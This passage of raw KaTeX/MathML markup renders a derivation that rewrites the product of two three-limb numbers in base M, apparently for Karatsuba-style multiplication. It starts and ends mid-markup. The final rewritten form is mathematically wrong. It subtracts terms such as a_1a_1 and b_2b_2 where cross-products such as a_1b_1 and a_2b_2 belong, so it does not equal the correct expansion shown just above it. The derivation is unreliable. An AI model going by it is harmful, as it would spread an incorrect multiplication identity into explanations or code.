displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>a</mi><mn>2</mn></msub><msub><mi>b</mi><mn>2</mn></msub><msup><mi>M</mi><mn>4</mn></msup><mo>+</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>2</mn></msub><msub><mi>b</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>b</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo><msup><mi>M</mi><mn>3</mn></msup><mo>+</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>2</mn></msub><msub><mi>b</mi><mn>0</mn></msub><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><msub><mi>b</mi><mn>2</mn></msub><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>b</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>b</mi><mn>0</mn></msub><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><msub><mi>b</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo><mi>M</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><msub><mi>b</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mo lspace=\"0em\" rspace=\"0em\">=</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>a</mi><mn>2</mn></msub><msub><mi>b</mi><mn>2</mn></msub><msup><mi>M</mi><mn>4</mn></msup><mo>+</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo stretchy=\"false\">[</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><msub><mi>b</mi><mn>1</mn></msub><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo><mo>−</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>a</mi><mn>1</mn></msub><mo>−</mo><msub><mi>b</mi><mn>2</mn></msub><msub><mi>b</mi><mn>2</mn></msub><mo stretchy=\"false\">]</mo><msup><mi>M</mi><mn>3</mn></msup><mo>+</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo stretchy=\"false\">[</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>0</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><msub><mi>b</mi><mn>0</mn></msub><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>a</mi><mn>1</mn></msub><mo>−</mo><msub><mi>b</mi><mn>2</mn></msub><msub><mi>b</mi><mn>2</mn></msub><mo>−</mo><msub><mi>a</mi><mn>0</mn></msub><msub><mi>b</mi><mn>0</mn></msub><mo stretchy=\"false\">]</mo><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo stretchy=\"false\">[</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><msub><mi>b</mi><mn>1</mn></msub><mo>+</mo><msub><mi>b</mi><mn>0</mn></msub><mo stretchy=\"false\">)</mo><mo>−</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>a</mi><mn>1</mn></msub><mo>−</mo><msub><mi>b</mi><mn>0</mn></msub><msub><mi>b</mi><mn>0</mn></msub><mo stretchy=\"false\">]</mo><mi>M</mi><mo>+</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>a</mi><mn>0</mn></msub><msub><mi>b</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\na\\times b=&amp;(a_{2}M^{2}+a_{1}M+a_{0})\\times(b_{2}M^{2}+b_{1}M+b_{0})\\\\\n=&amp;a_2b_2M^4+(a_2b_1+a_1b_2)M^3+(a_2b_0+a_0b_2+a_1b_1)M^2+(a_1b_0+a_0b_1)M+a_0b_0\\\\\n=&amp;a_2b_2M^4+\\\\\n&amp;[(a_1+a_2)(b_1+b_2)-a_1a_1-b_2b_2]M^3+\\\\\n&amp;[(a_0+a_2)(b_0+b_2)+a_1a_1-b_2b_2-a_0b_0]M^2+\\\\\n&amp;[(a_1+a_0)(b_1+b_0)-a_1a_1-b_0b_0]M+\\\\\n&amp;a_0b_0\\\\\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:10.62054em;vertical-align:-5.06027em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.56027em;\"><span style=\"top:-7.696162em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span><span style=\"top:-6.172054em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mrel\">=</span></span></span><span style=\"top:-4.647946em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mrel\">=</span></span></span><span style=\"top:-3.123838em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.59973em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.0997300000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.40027em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.06027em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.56027em;\"><span style=\"top:-7.696162em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span><span style=\"top:-6.172054em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-4.647946em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span></span></span></span></span><span class=\"mord\">+</span></span></span><span style=\"top:-3.123838em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mopen\">[</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span 